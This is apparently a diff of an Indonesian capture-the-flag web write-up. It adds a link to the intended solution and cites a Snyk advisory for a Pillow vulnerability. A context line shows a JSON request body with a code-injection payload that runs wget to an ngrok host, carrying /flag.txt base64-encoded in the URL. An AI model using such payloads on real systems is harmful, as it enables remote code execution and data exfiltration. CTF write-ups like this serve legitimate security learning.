@@ -88,5 +88,11 @@ Letakkan pada body dari request
 {"image":"imagerandom-char","background":["exec('import os; os.system(\"wget https://sth.ngrok.io/$(cat /flag.txt | base64)\")')",255,255]}
 ```
 
+
+## Intended Solution
+sumber: https://www.hackthebox.com/blog/acnologia-portal-ca-ctf-2022-web-writeup
+
+
+
 ## Sumber
 - https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901
